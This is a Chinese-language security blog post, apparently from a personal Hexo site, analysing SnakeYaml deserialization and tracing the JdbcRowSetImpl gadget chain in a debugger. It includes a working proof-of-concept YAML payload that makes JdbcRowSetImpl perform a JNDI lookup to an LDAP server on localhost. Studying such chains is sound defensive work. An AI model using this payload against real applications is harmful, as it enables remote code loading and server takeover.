@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>SnakeYaml反序列化简析 | F4miti0n&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="原理什么的，都还算比较简单，其中一部分可以归类到任意setter&#x2F;getter调用这一块 环境准备java环境是jdk8u66的pom.xml 123456789101112131415161718192021&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  &lt;project xmlns&#x3D;&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SnakeYaml反序列化简析">
+<meta property="og:url" content="http://example.com/2023/09/19/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%9E%90/index.html">
+<meta property="og:site_name" content="F4miti0n&#39;s Blog">
+<meta property="og:description" content="原理什么的，都还算比较简单，其中一部分可以归类到任意setter&#x2F;getter调用这一块 环境准备java环境是jdk8u66的pom.xml 123456789101112131415161718192021&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  &lt;project xmlns&#x3D;&quot;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/cover13.jpg">
+<meta property="article:published_time" content="2023-09-19T13:50:08.000Z">
+<meta property="article:modified_time" content="2023-09-20T03:00:01.986Z">
+<meta property="article:author" content="F4miti0n">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/cover13.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="F4miti0n's Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/banner.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>F4miti0n's Blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <img src="/images/avatar.png" alt="avatar">
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">F4miti0n </div>
+      <div class="dot"></div>
+      <div class="subtitle">每天都在对抗无趣的生活 </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E5%A4%8D%E7%8E%B0/" rel="tag">CTF复现</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E6%80%BB%E7%BB%93/" rel="tag">CTF总结</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/" rel="tag">安卓渗透</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%97%B2%E8%B0%88/" rel="tag">闲谈</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Archives</h3>
+      
+      
+        <a class="archive-link" href="/archives/2024/03 ">
+          March 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/02 ">
+          February 2024 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/01 ">
+          January 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/11 ">
+          November 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/10 ">
+          October 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/09 ">
+          September 2023 
+          <div class="archive-count">6 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/08 ">
+          August 2023 
+          <div class="archive-count">7 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/07 ">
+          July 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/05 ">
+          May 2023 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/04 ">
+          April 2023 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/03 ">
+          March 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/03/10/RASPDemo/">
+            <div class="recent-link-text">
+              从零开始的RASP学习
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)/">
+            <div class="recent-link-text">
+              Weblogic漏洞分析(一)
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/19/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(%E4%B8%80)/">
+            <div class="recent-link-text">
+              Jackson漏洞分析 (一)
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
+            <div class="recent-link-text">
+              关于2023的年度总结
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/11/05/Mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
+            <div class="recent-link-text">
+              Mysql任意文件读取
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-SnakeYaml反序列化简析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cmljqmlri0016m0wdbb334iul">
+        <img src="/images/cover13.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        SnakeYaml反序列化简析
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-09-19T13:50:08.000Z" itemprop="datePublished">2023-09-19</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    Uncategorized 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            2.3k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>原理什么的，都还算比较简单，其中一部分可以归类到任意setter&#x2F;getter调用这一块</p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>java环境是jdk8u66的<br><code>pom.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h3><h4 id="对于getter调用的验证"><a href="#对于getter调用的验证" class="headerlink" title="对于getter调用的验证"></a>对于getter调用的验证</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;mike&quot;</span>, <span class="number">18</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String username;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getUsername&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> username;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果如下<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918115804.png"></p>
+<h4 id="对于setter调用的验证"><a href="#对于setter调用的验证" class="headerlink" title="对于setter调用的验证"></a>对于setter调用的验证</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;!!SnakeYaml.Person &#123;age: 18, username: mike&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) yaml.load(str);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String username;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getUsername&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> username;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setUsername&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果如下<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918120004.png"></p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><h4 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h4><p>在本地起个ldap服务，这里是得到了可利用地址: <code>ldap://127.0.0.1:1389/prb171</code><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918120616.png"><br>之后开始着手分析，用到的测试类如下，我们在yaml.load下个断点开始分析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line"><span class="keyword">import</span> org.example.pojo.Person;  </span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:1389/prb171, autoCommit: true&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918121200.png"></p>
+<p>跟进一下发现是一些重载，我们盲跟两步，在<code>loadFromRead</code>中的289行打个断点，之后的流程以这里为起点跟进</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918121441.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918121847.png"></p>
+<p><code>getSingleData</code>的源码如下，简单分析一下，这块是先从我们所传入字节流中读取单个节点，之后再对该节点进行一系列判断，先判断当前节点是否为空，再判断当前节点是否为Java对象，最后再判断当前节点是否为根节点。不过这里面只有第一个判断是比较关键的，剩下两个判断不影响我们走到113行把节点转换成Java对象这里，我们跟进一下113行。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918122215.png"></p>
+<p>越过重载跟进到一个挺长的三目表达式这里，判断的对象是<code>this.constructObject</code>。这个对象简单地介绍一下，这是<code>SnakeYaml</code>为已加载过的对象所设的存储表，这块相当于是在进行一个缓存判断，因为表中没有我们本次要加载的对象，我们这里跟<code>this.constructObjectNoCheck(node)</code></p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918125452.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918125726.png"></p>
+<p>跟进之后，这里会先判断当前节点是否为自递归节点，如果不是的话就把当前节点加入<code>this.recuresiveObjects</code>里，然后再进行一个缓存判断，如果<code>constructedObjects</code>属性中存在与当前节点对应的Java对象，则返回该对象。如果不存在，则调用<code>constructor.construct</code>方法构造Java对象，我们这里是跟到了<code>constructor.construct()</code>这里。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918165854.png"></p>
+<p>跟进一下之后发现是个重载，根据<code>node</code>的类型来指派构造器，这里是指派到了<code>ConstrucMapping</code>类型的，我们跟进一下它的<code>construct</code>方法。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918170319.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918170719.png"></p>
+<p>在该方法里，会先将当前节点类型强转为<code>MappingNode</code>，之后再判断该节点的父类是否为<code>Map</code>，<code>Collection</code>中的任意一种。因为这里都不是，我们最终使用刚才获得到<code>Constructor.this.newInstance()</code>来实例化我们的<code>JdbcRowSetImpl</code>对象，而在474行则再会对我们的node进行判断，判断这个节点的实例化是否是那种可以一次完成的类型，如果确实是，则直接返回刚才生成的对象，如果不是，则用<code>this.constructJavaBean2ndStep()</code>进行第二次构造，我们这里还得再跟一下。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918171133.png"></p>
+<p>我们的终点在这个506行起头的<code>try</code>结构上，在这里面，他会有一个反射调用属性的set方法的过程。490行这里会对node下面的子节点进行constructedObjects的<br>遍历展开，分析起来有点麻烦，咱们就不详细跟进了，直接往后走流程。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918174641.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918182918.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918183044.png"></p>
+<p><code>$i</code> 是长这个样的，这里先从<code>keynode</code>中获得<code>key</code>，再根据<code>key</code>的名称获得属性对象，之后如法炮制获得<code>value</code>，最终在经过一系列判断之后，再<code>property.set()</code>中经过反射实现set方法的调用，到此为止<code>SnakeYaml</code>部分的东西就算结束了，我们再象征性的往后分析一下<code>JdbcRowSetImpl</code>链的部分。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918184211.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918183725.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918184604.png"></p>
+<p>第一个<code>property</code>是<code>dataSource</code>，跳过一堆反射步骤，最终调用的是<code>setDataSourceName</code>，最终通过父类的<code>setDataSourceName()</code>方法，把<code>DataSource</code>的值给安排妥当了。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918185712.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918185928.png"></p>
+<p>第二个<code>property</code>是<code>autoCommit</code>，最终调用的方法是<code>setAutoCommit</code> 。<code>setAutoCommit</code>这个方法里最关键的地方在于4067行调用<code>connect()</code>这块，我们跟进一下。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190149.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/SnakeYaml/Pasted%20image%2020230918190300.png"></p>
+<p>一点进来就能发现<code>try</code> 结构里面躺着的 <code>lookup</code>调用点，到此整条链子也就收工了。</p>
